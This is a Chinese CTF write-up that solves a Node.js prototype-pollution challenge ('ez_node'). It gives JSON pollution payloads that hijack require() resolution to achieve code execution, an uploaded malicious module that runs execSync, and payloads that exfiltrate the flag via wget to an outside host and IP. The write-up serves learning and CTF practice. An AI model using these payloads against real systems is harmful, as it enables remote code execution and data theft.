+++
title= "NSSRound8-ez_node"
slug= "nssround8-ez_node"
description= "nodejs PP根本学不会啊😣"
date= "2025-12-25T22:16:03+08:00"
lastmod= "2025-12-25T22:16:03+08:00"
image= ""
license= ""
categories= ["复现"]
tags= [""]

+++

这算是一道比较有意思的题目，详细分析下

```javascript
obj={
    errDict: [
        '发生肾么事了！！！发生肾么事了！！！',
        '随意污染靶机会寄的，建议先本地测',
        '李在干神魔👹',
        '真寄了就重开把',
    ],
    getRandomErr:() => {
        return obj.errDict[Math.floor(Math.random() * 4)]
    }
}
module.exports = obj
```

随机报错

```dockerfile
FROM node:alpine

ENV PROJECT_ENV production

ENV NODE_ENV production

COPY app /app
WORKDIR /app
COPY flag /flag
COPY start.sh /start.sh
RUN npm install express multer body-parser -g --registry https://registry.npm.taobao.org/ \
	&& echo "export NODE_PATH=/usr/local/lib/node_modules" >>/etc/profile \
	&& chmod a+x /start.sh

ENTRYPOINT /start.sh
```

应用代码

```javascript
const express = require("express");
const path = require("path");
const fs = require("fs");
const multer = require("multer");

const PORT = process.env.port || 3000
const app = express();

global = "global"

app.listen(PORT, () => {
    console.log(`listen at ${PORT}`);
});

function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}


let objMulter = multer({ dest: "./upload" });
app.use(objMulter.any());

app.use(express.static("./public"));

app.post("/upload", (req, res) => {
    try{
        let oldName = req.files[0].path;
        let newName = req.files[0].path + path.parse(req.files[0].originalname).ext;
        fs.renameSync(oldName, newName);
        res.send({
            err: 0,
            url:
            "./upload/" +
            req.files[0].filename +
            path.parse(req.files[0].originalname).ext
        });
    }
    catch(error){
        res.send(require('./err.js').getRandomErr())
    }
});

app.post('/pollution', require('body-parser').json(), (req, res) => {
    let data = {};
    try{
        merge(data, req.body);
        res.send('Register successfully!tql')
        require('./err.js').getRandomErr()
    }
    catch(error){
        res.send(require('./err.js').getRandomErr())
    }
})
```

没有特别好的可控点，在网上看了很多文章，发现居然是还是国外的 CTF，外国大佬就是会 PP 啊

https://downgraded.github.io/Balsn-CTF-2022-2linenodejs/

只要我们能进入 catch 模块进入 require 我们就可以依靠污染 err.js 达到 RCE

```javascript
function trySelf(parentPath, request) {
  if (!parentPath) return false;

  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
  if (!pkg || pkg.exports === undefined) return false;
  if (typeof pkg.name !== 'string') return false;

  let expansion;
  if (request === pkg.name) {
    expansion = '.';
  } else if (StringPrototypeStartsWith(request, `${pkg.name}/`)) {
    expansion = '.' + StringPrototypeSlice(request, pkg.name.length);
  } else {
    return false;
  }

  try {
    return finalizeEsmResolution(packageExportsResolve(
      pathToFileURL(pkgPath + '/package.json'), expansion, pkg,
      pathToFileURL(parentPath), cjsConditions), parentPath, pkgPath);
  } catch (e) {
    if (e.code === 'ERR_MODULE_NOT_FOUND')
      throw createEsmNotFoundErr(request, pkgPath + '/package.json');
    throw e;
  }
}
```

污染`data`和`path` ，就能分别控制`pkg`和`pkgPath`，

```json
{
  "%d": 1,
  "__proto__": {
    "toString": null,
    "data": {
      "name": "./usage",
      "exports": {
        ".": "./passwd"
      }
    },
    "path": "/etc"
  }
}
```

一葫芦画瓢

```json
{
  "%d": 1,
  "__proto__": {
    "toString": null,
    "data": {
      "name": "./err.js",
      "exports": {
        ".": "./844e6a5f9b781942a27338f1d95e46ef.js"
      }
    },
    "path": "./upload"
  }
}
```

上传的文件是

```javascript
obj={
  getRandomErr:() => {
    return require('child_process').execSync('tac /flag').toString()
  }
}
module.exports = obj
//{"err":0,"url":"./upload/844e6a5f9b781942a27338f1d95e46ef.js"}
```

这是通过覆盖文件达到的，与此同时，大佬还提出了一种打法，就是直接注入环境变量

/opt/yarn-v1.22.19/preinstall.js

```javascript
// This file is a bit weird, so let me explain with some context: we're working
// to implement a tool called "Corepack" in Node. This tool will allow us to
// provide a Yarn shim to everyone using Node, meaning that they won't need to
// run `npm install -g yarn`.
//
// Still, we don't want to break the experience of people that already use `npm
// install -g yarn`! And one annoying thing with npm is that they install their
// binaries directly inside the Node bin/ folder. And Because of this, they
// refuse to overwrite binaries when they detect they don't belong to npm. Which
// means that, since the "yarn" Corepack symlink belongs to Corepack and not npm,
// running `npm install -g yarn` would crash by refusing to override the binary :/
//
// And thus we have this preinstall script, which checks whether Yarn is being
// installed as a global binary, and remove the existing symlink if it detects
// it belongs to Corepack. Since preinstall scripts run, in npm, before the global
// symlink is created, we bypass this way the ownership check.
//
// More info:
// https://github.com/arcanis/pmm/issues/6

if (process.env.npm_config_global) {
  var cp = require('child_process');
  var fs = require('fs');
  var path = require('path');

  try {
    var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
      encoding: 'utf8',
      stdio: ['ignore', undefined, 'ignore'],
    }).replace(/\n/g, '');

    var manifest = require('./package.json');
    var binNames = typeof manifest.bin === 'string'
      ? [manifest.name.replace(/^@[^\/]+\//, '')]
      : typeof manifest.bin === 'object' && manifest.bin !== null
      ? Object.keys(manifest.bin)
      : [];

    binNames.forEach(function (binName) {
      var binPath = path.join(targetPath, binName);

      var binTarget;
      try {
        binTarget = fs.readlinkSync(binPath);
      } catch (err) {
        return;
      }

      if (binTarget.startsWith('../lib/node_modules/corepack/')) {
        try {
          fs.unlinkSync(binPath);
        } catch (err) {
          return;
        }
      }
    });
  } catch (err) {
    // ignore errors
  }
}
```

无法控制 `process.execPath` ，因为它始终是 node 可执行文件的路径（本例中为 `/usr/local/bin/node` ）。然而，我们确实能通过 `process.env.npm_execpath` 变量控制第一个参数。最终执行的命令将呈现为 `/usr/local/bin/node <OUR_INPUT> bin -g` 的形式。
通过掌控第一个参数，我们可以加载系统中的任意文件。虽然此前已具备此能力，但此次调用位于 `execFileSync()` 环境中，这意味着我们还能额外污染执行环境。在受污染的环境下，我们可以加载 `/proc/self/environ` 以实现任意代码执行。

```json
{
  "%d": 1,
  "__proto__": {
    "data": {
      "name": "./usage",
      "exports": {
        ".": "./preinstall.js"
      }
    },
    "path": "/opt/yarn-v1.22.19",
    "npm_config_global": 1,
    "npm_execpath": "--require=/proc/self/environ",
    "env": {
      "AAA": "require('child_process').execSync('wget$IFS\"\"http://downgrade.ml:4444/$IFS\"\"-U$IFS\"\"`/readflag`');//"
    }
  },
  "toString": null
}
```

试了下这样成功不了，不能从环境变量入手，估计是平台环境变量不同的原因

```json
{
  "%d": 1,
  "__proto__": {
    "data": {
      "name": "./err.js",
      "exports": {
        ".": "./preinstall.js"
      }
    },
    "path": "/opt/yarn-v1.22.19",
    "npm_config_global": 1,
    "npm_execpath": "--eval=require('child_process').execFile('sh',['-c','wget\thttp://154.36.181.12:10000/`tac /flag`'])"
  },
  "toString": null
}
```

我看写文章的大佬也就是后来挖掘 python 原型链污染的人（IDEKCTF 2023），也就到了我在 SUCTF2025 出的一道垃圾题，真是有缘分啊🙌
